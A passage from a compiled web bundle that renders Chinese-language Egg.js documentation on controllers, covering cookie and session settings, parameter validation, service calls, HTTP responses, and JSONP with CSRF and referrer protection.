\u5e94\u7528\u4e2d\u7ecf\u5e38\u627f\u62c5\u4e86\u4f20\u9012\u5ba2\u6237\u7aef\u8eab\u4efd\u4fe1\u606f\u7684\u4f5c\u7528\uff0c\u56e0\u6b64\u6709\u8bb8\u591a\u5b89\u5168\u76f8\u5173\u7684\u914d\u7f6e\uff0c\u4e0d\u53ef\u5ffd\u89c6\uff0c",r.a.createElement(l["AnchorLink"],{to:"../core/cookie-and-session#cookie"},"Cookie")," \u6587\u6863\u4e2d\u8be6\u7ec6\u4ecb\u7ecd\u4e86 Cookie \u7684\u7528\u6cd5\u548c\u5b89\u5168\u76f8\u5173\u7684\u914d\u7f6e\u9879\uff0c\u53ef\u4ee5\u6df1\u5165\u9605\u8bfb\u4e86\u89e3\u3002"),r.a.createElement("h4",{id:"\u914d\u7f6e"},r.a.createElement(l["AnchorLink"],{to:"#\u914d\u7f6e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u914d\u7f6e"),r.a.createElement("p",null,"\u5bf9\u4e8e Cookie \u6765\u8bf4\uff0c\u4e3b\u8981\u6709\u4e0b\u9762\u51e0\u4e2a\u5c5e\u6027\u53ef\u4ee5\u5728 ",r.a.createElement("code",null,"config.default.js")," \u4e2d\u8fdb\u884c\u914d\u7f6e:"),r.a.createElement(o["a"],{code:"module.exports = {\n  cookies: {\n    // httpOnly: true | false,\n    // sameSite: 'none|lax|strict',\n  },\n};",lang:"js"}),r.a.createElement("p",null,"\u4e3e\u4f8b: \u914d\u7f6e\u5e94\u7528\u7ea7\u522b\u7684 Cookie ",r.a.createElement(l["Link"],{to:"https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html"},"SameSite")," \u5c5e\u6027\u7b49\u4e8e ",r.a.createElement("code",null,"Lax"),"\u3002"),r.a.createElement(o["a"],{code:"module.exports = {\n  cookies: {\n    sameSite: 'lax',\n  },\n};",lang:"js"}),r.a.createElement("h3",{id:"session"},r.a.createElement(l["AnchorLink"],{to:"#session","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Session"),r.a.createElement("p",null,"\u901a\u8fc7 Cookie\uff0c\u6211\u4eec\u53ef\u4ee5\u7ed9\u6bcf\u4e00\u4e2a\u7528\u6237\u8bbe\u7f6e\u4e00\u4e2a Session\uff0c\u7528\u6765\u5b58\u50a8\u7528\u6237\u8eab\u4efd\u76f8\u5173\u7684\u4fe1\u606f\uff0c\u8fd9\u4efd\u4fe1\u606f\u4f1a\u52a0\u5bc6\u540e\u5b58\u50a8\u5728 Cookie \u4e2d\uff0c\u5b9e\u73b0\u8de8\u8bf7\u6c42\u7684\u7528\u6237\u8eab\u4efd\u4fdd\u6301\u3002"),r.a.createElement("p",null,"\u6846\u67b6\u5185\u7f6e\u4e86 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-session"},"Session")," \u63d2\u4ef6\uff0c\u7ed9\u6211\u4eec\u63d0\u4f9b\u4e86 ",r.a.createElement("code",null,"ctx.session")," \u6765\u8bbf\u95ee\u6216\u8005\u4fee\u6539\u5f53\u524d\u7528\u6237 Session \u3002"),r.a.createElement(o["a"],{code:"class PostController extends Controller {\n  async fetchPosts() {\n    const ctx = this.ctx;\n    // \u83b7\u53d6 Session \u4e0a\u7684\u5185\u5bb9\n    const userId = ctx.session.userId;\n    const posts = await ctx.service.post.fetch(userId);\n    // \u4fee\u6539 Session \u7684\u503c\n    ctx.session.visited = ctx.session.visited ? ++ctx.session.visited : 1;\n    ctx.body = {\n      success: true,\n      posts,\n    };\n  }\n}",lang:"js"}),r.a.createElement("p",null,"Session \u7684\u4f7f\u7528\u65b9\u6cd5\u975e\u5e38\u76f4\u89c2\uff0c\u76f4\u63a5\u8bfb\u53d6\u5b83\u6216\u8005\u4fee\u6539\u5b83\u5c31\u53ef\u4ee5\u4e86\uff0c\u5982\u679c\u8981\u5220\u9664\u5b83\uff0c\u76f4\u63a5\u5c06\u5b83\u8d4b\u503c\u4e3a ",r.a.createElement("code",null,"null"),"\uff1a"),r.a.createElement(o["a"],{code:"class SessionController extends Controller {\n  async deleteSession() {\n    this.ctx.session = null;\n  }\n}",lang:"js"}),r.a.createElement("p",null,"\u548c Cookie \u4e00\u6837\uff0cSession \u4e5f\u6709\u8bb8\u591a\u5b89\u5168\u7b49\u9009\u9879\u548c\u529f\u80fd\uff0c\u5728\u4f7f\u7528\u4e4b\u524d\u4e5f\u6700\u597d\u9605\u8bfb ",r.a.createElement(l["AnchorLink"],{to:"../core/cookie-and-session#session"},"Session")," \u6587\u6863\u6df1\u5165\u4e86\u89e3\u3002"),r.a.createElement("h4",{id:"\u914d\u7f6e-1"},r.a.createElement(l["AnchorLink"],{to:"#\u914d\u7f6e-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u914d\u7f6e"),r.a.createElement("p",null,"\u5bf9\u4e8e Session \u6765\u8bf4\uff0c\u4e3b\u8981\u6709\u4e0b\u9762\u51e0\u4e2a\u5c5e\u6027\u53ef\u4ee5\u5728 ",r.a.createElement("code",null,"config.default.js")," \u4e2d\u8fdb\u884c\u914d\u7f6e:"),r.a.createElement(o["a"],{code:"module.exports = {\n  key: 'EGG_SESS', // \u627f\u8f7d Session \u7684 Cookie \u952e\u503c\u5bf9\u540d\u5b57\n  maxAge: 86400000, // Session \u7684\u6700\u5927\u6709\u6548\u65f6\u95f4\n};",lang:"js"}),r.a.createElement("h2",{id:"\u53c2\u6570\u6821\u9a8c"},r.a.createElement(l["AnchorLink"],{to:"#\u53c2\u6570\u6821\u9a8c","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u53c2\u6570\u6821\u9a8c"),r.a.createElement("p",null,"\u5728\u83b7\u53d6\u5230\u7528\u6237\u8bf7\u6c42\u7684\u53c2\u6570\u540e\uff0c\u4e0d\u53ef\u907f\u514d\u7684\u8981\u5bf9\u53c2\u6570\u8fdb\u884c\u4e00\u4e9b\u6821\u9a8c\u3002"),r.a.createElement("p",null,"\u501f\u52a9 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-validate"},"Validate")," \u63d2\u4ef6\u63d0\u4f9b\u4fbf\u6377\u7684\u53c2\u6570\u6821\u9a8c\u673a\u5236\uff0c\u5e2e\u52a9\u6211\u4eec\u5b8c\u6210\u5404\u79cd\u590d\u6742\u7684\u53c2\u6570\u6821\u9a8c\u3002"),r.a.createElement(o["a"],{code:"// config/plugin.js\nexports.validate = {\n  enable: true,\n  package: 'egg-validate',\n};",lang:"js"}),r.a.createElement("p",null,"\u901a\u8fc7 ",r.a.createElement("code",null,"ctx.validate(rule, [body])")," \u76f4\u63a5\u5bf9\u53c2\u6570\u8fdb\u884c\u6821\u9a8c\uff1a"),r.a.createElement(o["a"],{code:"class PostController extends Controller {\n  async create() {\n    // \u6821\u9a8c\u53c2\u6570\n    // \u5982\u679c\u4e0d\u4f20\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4f1a\u81ea\u52a8\u6821\u9a8c `ctx.request.body`\n    this.ctx.validate({\n      title: { type: 'string' },\n      content: { type: 'string' },\n    });\n  }\n}",lang:"js"}),r.a.createElement("p",null,"\u5f53\u6821\u9a8c\u5f02\u5e38\u65f6\uff0c\u4f1a\u76f4\u63a5\u629b\u51fa\u4e00\u4e2a\u5f02\u5e38\uff0c\u5f02\u5e38\u7684\u72b6\u6001\u7801\u4e3a 422\uff0cerrors \u5b57\u6bb5\u5305\u542b\u4e86\u8be6\u7ec6\u7684\u9a8c\u8bc1\u4e0d\u901a\u8fc7\u4fe1\u606f\u3002\u5982\u679c\u60f3\u8981\u81ea\u5df1\u5904\u7406\u68c0\u67e5\u7684\u5f02\u5e38\uff0c\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"try catch")," \u6765\u81ea\u884c\u6355\u83b7\u3002"),r.a.createElement(o["a"],{code:"class PostController extends Controller {\n  async create() {\n    const ctx = this.ctx;\n    try {\n      ctx.validate(createRule);\n    } catch (err) {\n      ctx.logger.warn(err.errors);\n      ctx.body = { success: false };\n      return;\n    }\n  }\n}",lang:"js"}),r.a.createElement("h3",{id:"\u6821\u9a8c\u89c4\u5219"},r.a.createElement(l["AnchorLink"],{to:"#\u6821\u9a8c\u89c4\u5219","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6821\u9a8c\u89c4\u5219"),r.a.createElement("p",null,"\u53c2\u6570\u6821\u9a8c\u901a\u8fc7 ",r.a.createElement(l["Link"],{to:"https://github.com/node-modules/parameter#rule"},"Parameter")," \u5b8c\u6210\uff0c\u652f\u6301\u7684\u6821\u9a8c\u89c4\u5219\u53ef\u4ee5\u5728\u8be5\u6a21\u5757\u7684\u6587\u6863\u4e2d\u67e5\u9605\u5230\u3002"),r.a.createElement("h4",{id:"\u81ea\u5b9a\u4e49\u6821\u9a8c\u89c4\u5219"},r.a.createElement(l["AnchorLink"],{to:"#\u81ea\u5b9a\u4e49\u6821\u9a8c\u89c4\u5219","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u81ea\u5b9a\u4e49\u6821\u9a8c\u89c4\u5219"),r.a.createElement("p",null,"\u9664\u4e86\u4e0a\u4e00\u8282\u4ecb\u7ecd\u7684\u5185\u7f6e\u68c0\u9a8c\u7c7b\u578b\u5916\uff0c\u6709\u65f6\u5019\u6211\u4eec\u5e0c\u671b\u81ea\u5b9a\u4e49\u4e00\u4e9b\u6821\u9a8c\u89c4\u5219\uff0c\u8ba9\u5f00\u53d1\u65f6\u66f4\u4fbf\u6377\uff0c\u6b64\u65f6\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"app.validator.addRule(type, check)")," \u7684\u65b9\u5f0f\u65b0\u589e\u81ea\u5b9a\u4e49\u89c4\u5219\u3002"),r.a.createElement(o["a"],{code:"// app.js\napp.validator.addRule('json', (rule, value) => {\n  try {\n    JSON.parse(value);\n  } catch (err) {\n    return 'must be json string';\n  }\n});",lang:"js"}),r.a.createElement("p",null,"\u6dfb\u52a0\u5b8c\u81ea\u5b9a\u4e49\u89c4\u5219\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u5728 Controller \u4e2d\u76f4\u63a5\u4f7f\u7528\u8fd9\u6761\u89c4\u5219\u6765\u8fdb\u884c\u53c2\u6570\u6821\u9a8c\u4e86"),r.a.createElement(o["a"],{code:"class PostController extends Controller {\n  async handler() {\n    const ctx = this.ctx;\n    // query.test \u5b57\u6bb5\u5fc5\u987b\u662f json \u5b57\u7b26\u4e32\n    const rule = { test: 'json' };\n    ctx.validate(rule, ctx.query);\n  }\n}",lang:"js"}),r.a.createElement("h2",{id:"\u8c03\u7528-service"},r.a.createElement(l["AnchorLink"],{to:"#\u8c03\u7528-service","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8c03\u7528 Service"),r.a.createElement("p",null,"\u6211\u4eec\u5e76\u4e0d\u60f3\u5728 Controller \u4e2d\u5b9e\u73b0\u592a\u591a\u4e1a\u52a1\u903b\u8f91\uff0c\u6240\u4ee5\u63d0\u4f9b\u4e86\u4e00\u4e2a ",r.a.createElement(l["Link"],{to:"./service"},"Service")," \u5c42\u8fdb\u884c\u4e1a\u52a1\u903b\u8f91\u7684\u5c01\u88c5\uff0c\u8fd9\u4e0d\u4ec5\u80fd\u63d0\u9ad8\u4ee3\u7801\u7684\u590d\u7528\u6027\uff0c\u540c\u65f6\u53ef\u4ee5\u8ba9\u6211\u4eec\u7684\u4e1a\u52a1\u903b\u8f91\u66f4\u597d\u6d4b\u8bd5\u3002"),r.a.createElement("p",null,"\u5728 Controller \u4e2d\u53ef\u4ee5\u8c03\u7528\u4efb\u4f55\u4e00\u4e2a Service \u4e0a\u7684\u4efb\u4f55\u65b9\u6cd5\uff0c\u540c\u65f6 Service \u662f\u61d2\u52a0\u8f7d\u7684\uff0c\u53ea\u6709\u5f53\u8bbf\u95ee\u5230\u5b83\u7684\u65f6\u5019\u6846\u67b6\u624d\u4f1a\u53bb\u5b9e\u4f8b\u5316\u5b83\u3002"),r.a.createElement(o["a"],{code:"class PostController extends Controller {\n  async create() {\n    const ctx = this.ctx;\n    const author = ctx.session.userId;\n    const req = Object.assign(ctx.request.body, { author });\n    // \u8c03\u7528 service \u8fdb\u884c\u4e1a\u52a1\u5904\u7406\n    const res = await ctx.service.post.create(req);\n    ctx.body = { id: res.id };\n    ctx.status = 201;\n  }\n}",lang:"js"}),r.a.createElement("p",null,"Service \u7684\u5177\u4f53\u5199\u6cd5\uff0c\u8bf7\u67e5\u770b ",r.a.createElement(l["Link"],{to:"./service"},"Service")," \u7ae0\u8282\u3002"),r.a.createElement("h2",{id:"\u53d1\u9001-http-\u54cd\u5e94"},r.a.createElement(l["AnchorLink"],{to:"#\u53d1\u9001-http-\u54cd\u5e94","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u53d1\u9001 HTTP \u54cd\u5e94"),r.a.createElement("p",null,"\u5f53\u4e1a\u52a1\u903b\u8f91\u5b8c\u6210\u4e4b\u540e\uff0cController \u7684\u6700\u540e\u4e00\u4e2a\u804c\u8d23\u5c31\u662f\u5c06\u4e1a\u52a1\u903b\u8f91\u7684\u5904\u7406\u7ed3\u679c\u901a\u8fc7 HTTP \u54cd\u5e94\u53d1\u9001\u7ed9\u7528\u6237\u3002"),r.a.createElement("h3",{id:"\u8bbe\u7f6e-status"},r.a.createElement(l["AnchorLink"],{to:"#\u8bbe\u7f6e-status","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8bbe\u7f6e status"),r.a.createElement("p",null,"HTTP \u8bbe\u8ba1\u4e86\u975e\u5e38\u591a\u7684",r.a.createElement(l["Link"],{to:"https://en.wikipedia.org/wiki/List_of_HTTP_status_codes"},"\u72b6\u6001\u7801"),"\uff0c\u6bcf\u4e00\u4e2a\u72b6\u6001\u7801\u90fd\u4ee3\u8868\u4e86\u4e00\u4e2a\u7279\u5b9a\u7684\u542b\u4e49\uff0c\u901a\u8fc7\u8bbe\u7f6e\u6b63\u786e\u7684\u72b6\u6001\u7801\uff0c\u53ef\u4ee5\u8ba9\u54cd\u5e94\u66f4\u7b26\u5408\u8bed\u4e49\u3002"),r.a.createElement("p",null,"\u6846\u67b6\u63d0\u4f9b\u4e86\u4e00\u4e2a\u4fbf\u6377\u7684 Setter \u6765\u8fdb\u884c\u72b6\u6001\u7801\u7684\u8bbe\u7f6e"),r.a.createElement(o["a"],{code:"class PostController extends Controller {\n  async create() {\n    // \u8bbe\u7f6e\u72b6\u6001\u7801\u4e3a 201\n    this.ctx.status = 201;\n  }\n}",lang:"js"}),r.a.createElement("p",null,"\u5177\u4f53\u4ec0\u4e48\u573a\u666f\u8bbe\u7f6e\u4ec0\u4e48\u6837\u7684\u72b6\u6001\u7801\uff0c\u53ef\u4ee5\u53c2\u8003 ",r.a.createElement(l["Link"],{to:"https://en.wikipedia.org/wiki/List_of_HTTP_status_codes"},"List of HTTP status codes")," \u4e2d\u5404\u4e2a\u72b6\u6001\u7801\u7684\u542b\u4e49\u3002"),r.a.createElement("h3",{id:"\u8bbe\u7f6e-body"},r.a.createElement(l["AnchorLink"],{to:"#\u8bbe\u7f6e-body","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8bbe\u7f6e body"),r.a.createElement("p",null,"\u7edd\u5927\u591a\u6570\u7684\u6570\u636e\u90fd\u662f\u901a\u8fc7 body \u53d1\u9001\u7ed9\u8bf7\u6c42\u65b9\u7684\uff0c\u548c\u8bf7\u6c42\u4e2d\u7684 body \u4e00\u6837\uff0c\u5728\u54cd\u5e94\u4e2d\u53d1\u9001\u7684 body\uff0c\u4e5f\u9700\u8981\u6709\u914d\u5957\u7684 Content-Type \u544a\u77e5\u5ba2\u6237\u7aef\u5982\u4f55\u5bf9\u6570\u636e\u8fdb\u884c\u89e3\u6790\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u4f5c\u4e3a\u4e00\u4e2a RESTful \u7684 API \u63a5\u53e3 controller\uff0c\u6211\u4eec\u901a\u5e38\u4f1a\u8fd4\u56de Content-Type \u4e3a ",r.a.createElement("code",null,"application/json")," \u683c\u5f0f\u7684 body\uff0c\u5185\u5bb9\u662f\u4e00\u4e2a JSON \u5b57\u7b26\u4e32\u3002"),r.a.createElement("li",null,"\u4f5c\u4e3a\u4e00\u4e2a html \u9875\u9762\u7684 controller\uff0c\u6211\u4eec\u901a\u5e38\u4f1a\u8fd4\u56de Content-Type \u4e3a ",r.a.createElement("code",null,"text/html")," \u683c\u5f0f\u7684 body\uff0c\u5185\u5bb9\u662f html \u4ee3\u7801\u6bb5\u3002")),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a",r.a.createElement("code",null,"ctx.body")," \u662f ",r.a.createElement("code",null,"ctx.response.body")," \u7684\u7b80\u5199\uff0c\u4e0d\u8981\u548c ",r.a.createElement("code",null,"ctx.request.body")," \u6df7\u6dc6\u4e86\u3002")),r.a.createElement(o["a"],{code:"class ViewController extends Controller {\n  async show() {\n    this.ctx.body = {\n      name: 'egg',\n      category: 'framework',\n      language: 'Node.js',\n    };\n  }\n\n  async page() {\n    this.ctx.body = '<html><h1>Hello</h1></html>';\n  }\n}",lang:"js"}),r.a.createElement("p",null,"\u7531\u4e8e Node.js \u7684\u6d41\u5f0f\u7279\u6027\uff0c\u6211\u4eec\u8fd8\u6709\u5f88\u591a\u573a\u666f\u9700\u8981\u901a\u8fc7 Stream \u8fd4\u56de\u54cd\u5e94\uff0c\u4f8b\u5982\u8fd4\u56de\u4e00\u4e2a\u5927\u6587\u4ef6\uff0c\u4ee3\u7406\u670d\u52a1\u5668\u76f4\u63a5\u8fd4\u56de\u4e0a\u6e38\u7684\u5185\u5bb9\uff0c\u6846\u67b6\u4e5f\u652f\u6301\u76f4\u63a5\u5c06 body \u8bbe\u7f6e\u6210\u4e00\u4e2a Stream\uff0c\u5e76\u4f1a\u540c\u65f6\u5904\u7406\u597d\u8fd9\u4e2a Stream \u4e0a\u7684\u9519\u8bef\u4e8b\u4ef6\u3002"),r.a.createElement(o["a"],{code:"class ProxyController extends Controller {\n  async proxy() {\n    const ctx = this.ctx;\n    const result = await ctx.curl(url, {\n      streaming: true,\n    });\n    ctx.set(result.header);\n    // result.res \u662f\u4e00\u4e2a stream\n    ctx.body = result.res;\n  }\n}",lang:"js"}),r.a.createElement("h4",{id:"\u6e32\u67d3\u6a21\u677f"},r.a.createElement(l["AnchorLink"],{to:"#\u6e32\u67d3\u6a21\u677f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6e32\u67d3\u6a21\u677f"),r.a.createElement("p",null,"\u901a\u5e38\u6765\u8bf4\uff0c\u6211\u4eec\u4e0d\u4f1a\u624b\u5199 HTML \u9875\u9762\uff0c\u800c\u662f\u4f1a\u901a\u8fc7\u6a21\u677f\u5f15\u64ce\u8fdb\u884c\u751f\u6210\u3002 \u6846\u67b6\u81ea\u8eab\u6ca1\u6709\u96c6\u6210\u4efb\u4f55\u4e00\u4e2a\u6a21\u677f\u5f15\u64ce\uff0c\u4f46\u662f\u7ea6\u5b9a\u4e86 ",r.a.createElement(l["Link"],{to:"../advanced/view-plugin"},"View \u63d2\u4ef6\u7684\u89c4\u8303"),"\uff0c\u901a\u8fc7\u63a5\u5165\u7684\u6a21\u677f\u5f15\u64ce\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 ",r.a.createElement("code",null,"ctx.render(template)")," \u6765\u6e32\u67d3\u6a21\u677f\u751f\u6210 html\u3002"),r.a.createElement(o["a"],{code:"class HomeController extends Controller {\n  async index() {\n    const ctx = this.ctx;\n    await ctx.render('home.tpl', { name: 'egg' });\n    // ctx.body = await ctx.renderString('hi, {{ name }}', { name: 'egg' });\n  }\n}",lang:"js"}),r.a.createElement("p",null,"\u5177\u4f53\u793a\u4f8b\u53ef\u4ee5\u67e5\u770b",r.a.createElement(l["Link"],{to:"../core/view"},"\u6a21\u677f\u6e32\u67d3"),"\u3002"),r.a.createElement("h4",{id:"jsonp"},r.a.createElement(l["AnchorLink"],{to:"#jsonp","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"JSONP"),r.a.createElement("p",null,"\u6709\u65f6\u6211\u4eec\u9700\u8981\u7ed9\u975e\u672c\u57df\u7684\u9875\u9762\u63d0\u4f9b\u63a5\u53e3\u670d\u52a1\uff0c\u53c8\u7531\u4e8e\u4e00\u4e9b\u5386\u53f2\u539f\u56e0\u65e0\u6cd5\u901a\u8fc7 ",r.a.createElement(l["Link"],{to:"https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS"},"CORS")," \u5b9e\u73b0\uff0c\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement(l["Link"],{to:"https://en.wikipedia.org/wiki/JSONP"},"JSONP")," \u6765\u8fdb\u884c\u54cd\u5e94\u3002"),r.a.createElement("p",null,"\u7531\u4e8e JSONP \u5982\u679c\u4f7f\u7528\u4e0d\u5f53\u4f1a\u5bfc\u81f4\u975e\u5e38\u591a\u7684\u5b89\u5168\u95ee\u9898\uff0c\u6240\u4ee5\u6846\u67b6\u4e2d\u63d0\u4f9b\u4e86\u4fbf\u6377\u7684\u54cd\u5e94 JSONP \u683c\u5f0f\u6570\u636e\u7684\u65b9\u6cd5\uff0c\u5c01\u88c5\u4e86 ",r.a.createElement(l["AnchorLink"],{to:"../core/security#jsonp-xss"},"JSONP XSS \u76f8\u5173\u7684\u5b89\u5168\u9632\u8303"),"\uff0c\u5e76\u652f\u6301\u8fdb\u884c CSRF \u6821\u9a8c\u548c referrer \u6821\u9a8c\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u901a\u8fc7 ",r.a.createElement("code",null,"app.jsonp()")," \u63d0\u4f9b\u7684\u4e2d\u95f4\u4ef6\u6765\u8ba9\u4e00\u4e2a controller \u652f\u6301\u54cd\u5e94 JSONP \u683c\u5f0f\u7684\u6570\u636e\u3002\u5728\u8def\u7531\u4e2d\uff0c\u6211\u4eec\u7ed9\u9700\u8981\u652f\u6301 jsonp \u7684\u8def\u7531\u52a0\u4e0a\u8fd9\u4e2a\u4e2d\u95f4\u4ef6\uff1a")),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  const jsonp = app.jsonp();\n  app.router.get('/api/posts/:id', jsonp, app.controller.posts.show);\n  app.router.get('/api/posts', jsonp, app.controller.posts.list);\n};",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5728 Controller \u4e2d\uff0c\u53ea\u9700\u8981\u6b63\u5e38\u7f16\u5199\u5373\u53ef\uff1a")),r.a.createElement(o["a"],{code:"// app/controller/posts.js\nclass PostController extends Controller {\n  async show() {\n    this.ctx.body = {\n      name: 'egg',\n      category: 'framework',\n      language: 'Node.js',\n    };\n  }\n}",lang:"js"}),r.a.createElement("p",null,"\u7528\u6237\u8bf7\u6c42\u5bf9\u5e94\u7684 URL \u8bbf\u95ee\u5230\u8fd9\u4e2a controller \u7684\u65f6\u5019\uff0c\u5982\u679c query \u4e2d\u6709 ",r.a.createElement("code",null,"_callback=fn")," \u53c2\u6570\uff0c\u5c06\u4f1a\u8fd4\u56de JSONP \u683c\u5f0f\u7684\u6570\u636e\uff0c\u5426\u5219\u8fd4\u56de JSON \u683c\u5f0f\u7684\u6570\u636e\u3002"),r.a.createElement("h5",{id:"jsonp-\u914d\u7f6e"},r.a.createElement(l["AnchorLink"],{to:"#jsonp-\u914d\u7f6e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"JSONP \u914d\u7f6e"),r.a.createElement("p",null,"\u6846\u67b6\u9ed8\u8ba4\u901a\u8fc7 query \u4e2d\u7684 ",r.a.createElement("code",null,"_callback")," \u53c2\u6570\u4f5c\u4e3a\u8bc6\u522b\u662f\u5426\u8fd4\u56de JSONP \u683c\u5f0f\u6570\u636e\u7684\u4f9d\u636e\uff0c\u5e76\u4e14 ",r.a.createElement("code",null,"_callback")," \u4e2d\u8bbe\u7f6e\u7684\u65b9\u6cd5\u540d\u957f\u5ea6\u6700\u591a\u53ea\u5141\u8bb8 50 \u4e2a\u5b57\u7b26\u3002\u5e94\u7528\u53ef\u4ee5\u5728 ",r.a.createElement("code",null,"config/config.default.js")," \u5168\u5c40\u8986\u76d6\u9ed8\u8ba4\u7684\u914d\u7f6e\uff1a"),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.jsonp = {\n  callback: 'callback', // \u8bc6\u522b query \u4e2d\u7684 `callback` \u53c2\u6570\n  limit: 100, // \u51fd\u6570\u540d\u6700\u957f\u4e3a 100 \u4e2a\u5b57\u7b26\n};",lang:"js"}),r.a.createElement("p",null,"\u901a\u8fc7\u4e0a\u9762\u7684\u65b9\u5f0f\u914d\u7f6e\u4e4b\u540e\uff0c\u5982\u679c\u7528\u6237\u8bf7\u6c42 ",r.a.createElement("code",null,"/api/posts/1?callback=fn"),"\uff0c\u54cd\u5e94\u4e3a JSONP \u683c\u5f0f\uff0c\u5982\u679c\u7528\u6237\u8bf7\u6c42 ",r.a.createElement("code",null,"/api/posts/1"),"\uff0c\u54cd\u5e94\u683c\u5f0f\u4e3a JSON\u3002"),r.a.createElement("p",null,"\u6211\u4eec\u540c\u6837\u53ef\u4ee5\u5728 ",r.a.createElement("code",null,"app.jsonp()")," \u521b\u5efa\u4e2d\u95f4\u4ef6\u65f6\u8986\u76d6\u9ed8\u8ba4\u7684\u914d\u7f6e\uff0c\u4ee5\u8fbe\u5230\u4e0d\u540c\u8def\u7531\u4f7f\u7528\u4e0d\u540c\u914d\u7f6e\u7684\u76ee\u7684\uff1a"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  const { router, controller, jsonp } = app;\n  router.get(\n    '/api/posts/:id',\n    jsonp({ callback: 'callback' }),\n    controller.posts.show,\n  );\n  router.get('/api/posts', jsonp({ callback: 'cb' }), controller.posts.list);\n};",lang:"js"}),r.a.createElement("h5",{id:"\u8de8\u7ad9\u9632\u5fa1\u914d\u7f6e"},r.a.createElement(l["AnchorLink"],{to:"#\u8de8\u7ad9\u9632\u5fa1\u914d\u7f6e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8de8\u7ad9\u9632\u5fa1\u914d\u7f6e"),r.a.createElement("p",null,"\u9ed8\u8ba4\u914d\u7f6e\u4e0b\uff0c\u54cd\u5e94 JSONP \u65f6\u4e0d\u4f1a\u8fdb\u884c\u4efb\u4f55\u8de8\u7ad9\u653b\u51fb\u7684\u9632\u8303\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u8fd9\u662f\u5f88\u5371\u9669\u7684\u3002\u6211\u4eec\u521d\u7565\u5c06 JSONP \u63a5\u53e3\u5206\u4e3a\u4e09\u79cd\u7c7b\u578b\uff1a"),r.a.createElement("ol",null,r.a.createElement("li",null,"\u67e5\u8be2\u975e\u654f\u611f\u6570\u636e\uff0c\u4f8b\u5982\u83b7\u53d6\u4e00\u4e2a\u8bba\u575b\u7684\u516c\u5f00\u6587\u7ae0\u5217\u8868\u3002"),r.a.createElement("li",null,"\u67e5\u8be2\u654f\u611f\u6570\u636e\uff0c\u4f8b\u5982\u83b7\u53d6\u4e00\u4e2a\u7528\u6237\u7684\u4ea4\u6613\u8bb0\u5f55\u3002"),r.a.createElement("li",null,"\u63d0\u4ea4\u6570\u636e\u5e76\u4fee\u6539\u6570\u636e\u5e93\uff0c\u4f8b\u5982\u7ed9\u67d0\u4e00\u4e2a\u7528\u6237\u521b\u5efa\u4e00\u7b14\u8ba2\u5355\u3002")),r.a.createElement("p",null,"\u5982\u679c\u6211\u4eec\u7684 JSONP \u63a5\u53e3\u63d0\u4f9b\u4e0b\u9762\u4e24\u7c7b\u670d\u52a1\uff0c\u5728\u4e0d\u505a\u4efb\u4f55\u8de8\u7ad9\u9632\u5fa1\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u80fd\u6cc4\u9732\u7528\u6237\u654f\u611f\u6570\u636e\u751a\u81f3\u5bfc\u81f4\u7528\u6237\u88ab\u9493\u9c7c\u3002\u56e0\u6b64\u6846\u67b6\u7ed9 JSONP \u9ed8\u8ba4\u63d0\u4f9b\u4e86 CSRF \u6821\u9a8c\u652f\u6301\u548c referrer \u6821\u9a8c\u652f\u6301\u3002"),r.a.createElement("h6",{id:"csrf"},r.a.createElement(l["AnchorLink"],{to:"#csrf","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"CSRF"),r.a.createElement("p",null,"\u5728 JSONP \u914d\u7f6e\u4e2d\uff0c\u6211\u4eec\u53ea\u9700\u8981\u6253\u5f00 ",r.a.createElement("code",null,"csrf: true"),"\uff0c\u5373\u53ef\u5bf9 JSONP \u63a5\u53e3\u5f00\u542f CSRF \u6821\u9a8c\u3002"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  jsonp: {\n    csrf: true,\n  },\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff0cCSRF \u6821\u9a8c\u4f9d\u8d56\u4e8e ",r.a.createElement(l["Link"],{to:"../core/security"},"security")," \u63d2\u4ef6\u63d0\u4f9b\u7684\u57fa\u4e8e Cookie \u7684 CSRF \u6821\u9a8c\u3002")),r.a.createElement("p",null,"\u5728\u5f00\u542f CSRF 